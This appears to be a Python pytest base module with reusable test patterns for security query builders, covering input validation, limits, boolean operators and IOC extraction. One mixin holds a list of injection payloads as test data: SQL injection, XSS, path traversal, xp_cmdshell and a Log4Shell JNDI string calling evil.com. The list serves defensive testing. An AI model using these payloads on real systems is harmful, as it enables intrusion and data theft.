"""Base test class with common test patterns for all query builders.

This module provides abstract test methods and helper utilities that can be
reused across all query builder test suites to ensure consistent coverage.
"""

from typing import Any, Callable, Dict, Optional
import pytest


class BaseQueryBuilderTest:
    """Base class with common test patterns for query builders.
    
    Test classes should inherit from this and implement the abstract methods
    to provide builder-specific implementations.
    """
    
    # Subclasses must define these
    @property
    def builder_function(self) -> Callable:
        """Return the query builder function to test."""
        raise NotImplementedError("Subclasses must implement builder_function")
    
    @property
    def mock_schema(self) -> Dict[str, Any]:
        """Return the mock schema for testing."""
        raise NotImplementedError("Subclasses must implement mock_schema")
    
    @property
    def required_params(self) -> Dict[str, Any]:
        """Return minimum required parameters for a valid query."""
        raise NotImplementedError("Subclasses must implement required_params")
    
    # Common test patterns
    def test_empty_natural_language_intent(self):
        """Test that empty natural language intent is handled gracefully."""
        # Should either raise an error or require other parameters
        with pytest.raises((ValueError, Exception)):
            self.builder_function(
                schema=self.mock_schema,
                natural_language_intent=""
            )
    
    def test_none_natural_language_intent_without_params(self):
        """Test that None intent without other params raises an error."""
        with pytest.raises((ValueError, Exception)):
            self.builder_function(
                schema=self.mock_schema,
                natural_language_intent=None
            )
    
    def test_whitespace_only_intent(self):
        """Test that whitespace-only intent is handled properly."""
        with pytest.raises((ValueError, Exception)):
            self.builder_function(
                schema=self.mock_schema,
                natural_language_intent="   \n\t   "
            )
    
    def test_invalid_schema_type(self):
        """Test that invalid schema type raises appropriate error."""
        with pytest.raises((ValueError, TypeError, AttributeError)):
            self.builder_function(
                schema="not a dict",  # Invalid schema type
                **self.required_params
            )
    
    def test_empty_schema(self):
        """Test behavior with empty schema."""
        # Some builders may still work with empty schema, others may fail
        # This test documents the expected behavior
        try:
            query, metadata = self.builder_function(
                schema={},
                **self.required_params
            )
            # If it succeeds, ensure query is a string
            assert isinstance(query, str)
            assert len(query) > 0
        except (ValueError, KeyError, Exception):
            # Failing is also acceptable for empty schema
            pass
    
    def test_query_returns_tuple(self):
        """Test that builder returns a tuple of (query, metadata)."""
        query, metadata = self.builder_function(
            schema=self.mock_schema,
            **self.required_params
        )
        
        assert isinstance(query, str), "Query should be a string"
        assert isinstance(metadata, dict), "Metadata should be a dictionary"
        assert len(query) > 0, "Query should not be empty"
    
    def test_metadata_contains_expected_keys(self):
        """Test that metadata contains platform-specific keys."""
        _, metadata = self.builder_function(
            schema=self.mock_schema,
            **self.required_params
        )
        
        assert isinstance(metadata, dict)
        # Metadata should contain at least one key
        assert len(metadata) > 0


class SecurityValidationMixin:
    """Mixin for testing security validation across all builders."""
    
    def get_injection_test_cases(self) -> list[str]:
        """Return list of injection attack test cases.
        
        Subclasses can override to add platform-specific cases.
        """
        return [
            "; DROP TABLE users",
            "' OR '1'='1",
            "'; DELETE FROM table; --",
            "1' UNION SELECT * FROM passwords--",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "'; EXEC xp_cmdshell('dir'); --",
        ]
    
    def test_injection_prevention_in_natural_language(self):
        """Test that injection attempts in natural language are blocked."""
        for injection in self.get_injection_test_cases():
            # Attempting to inject malicious content should either:
            # 1. Raise an error, or
            # 2. Sanitize/escape the input safely
            try:
                query, _ = self.builder_function(
                    schema=self.mock_schema,
                    natural_language_intent=f"find processes {injection}"
                )
                # If it succeeds, ensure the dangerous parts are escaped/quoted
                # The exact check depends on the platform
                assert injection not in query or "'" in query or '"' in query
            except (ValueError, Exception):
                # Raising an error is acceptable
                pass


class IOCExtractionMixin:
    """Mixin for testing IOC (Indicator of Compromise) extraction."""
    
    def get_ioc_test_cases(self) -> Dict[str, str]:
        """Return dictionary of IOC type to test value.
        
        Subclasses can override to customize.
        """
        return {
            "ipv4": "192.168.1.100",
            "ipv6": "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
            "md5": "5d41402abc4b2a76b9719d911017c592",
            "sha256": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
            "domain": "malicious.example.com",
        }
    
    def test_ioc_extraction_from_natural_language(self):
        """Test that IOCs are extracted from natural language.
        
        This is a basic implementation - subclasses should override
        with platform-specific assertions.
        """
        iocs = self.get_ioc_test_cases()
        
        for ioc_type, ioc_value in iocs.items():
            try:
                query, metadata = self.builder_function(
                    schema=self.mock_schema,
                    natural_language_intent=f"find activity for {ioc_value}"
                )
                
                # Query should contain the IOC or a reference to it
                assert ioc_value in query or ioc_type in str(metadata).lower()
            except (ValueError, KeyError):
                # Some builders may not support all IOC types
                pass


class LimitValidationMixin:
    """Mixin for testing limit parameter validation."""
    
    def get_max_limit(self) -> Optional[int]:
        """Return the maximum allowed limit for this builder.
        
        Return None if there's no hard maximum.
        """
        return None
    
    def test_negative_limit(self):
        """Test that negative limits are rejected or normalized."""
        with pytest.raises((ValueError, Exception)):
            self.builder_function(
                schema=self.mock_schema,
                limit=-1,
                **self.required_params
            )
    
    def test_zero_limit(self):
        """Test that zero limit is rejected or normalized."""
        with pytest.raises((ValueError, Exception)):
            self.builder_function(
                schema=self.mock_schema,
                limit=0,
                **self.required_params
            )
    
    def test_excessive_limit_clamping(self):
        """Test that excessively large limits are clamped if applicable."""
        max_limit = self.get_max_limit()
        if max_limit is None:
            pytest.skip("No maximum limit defined for this builder")
        
        query, metadata = self.builder_function(
            schema=self.mock_schema,
            limit=max_limit + 10000,
            **self.required_params
        )
        
        # Should either clamp to max or document the large limit
        if "limit" in metadata:
            assert metadata["limit"] <= max_limit or "limit_clamped" in metadata


class BooleanOperatorMixin:
    """Mixin for testing boolean operator validation."""
    
    def get_valid_operators(self) -> list[str]:
        """Return list of valid boolean operators for this builder."""
        return ["AND", "OR"]
    
    def test_valid_boolean_operators(self):
        """Test that all valid boolean operators work."""
        for operator in self.get_valid_operators():
            try:
                query, metadata = self.builder_function(
                    schema=self.mock_schema,
                    boolean_operator=operator,
                    **self.required_params
                )
                
                assert isinstance(query, str)
                assert len(query) > 0
            except AttributeError:
                # Some builders may not support boolean_operator parameter
                pytest.skip(f"Builder does not support boolean_operator parameter")
    
    def test_invalid_boolean_operator(self):
        """Test that invalid boolean operators are rejected."""
        try:
            with pytest.raises((ValueError, Exception)):
                self.builder_function(
                    schema=self.mock_schema,
                    boolean_operator="XOR",
                    **self.required_params
                )
        except TypeError:
            # Some builders may not support boolean_operator parameter
            pytest.skip("Builder does not support boolean_operator parameter")
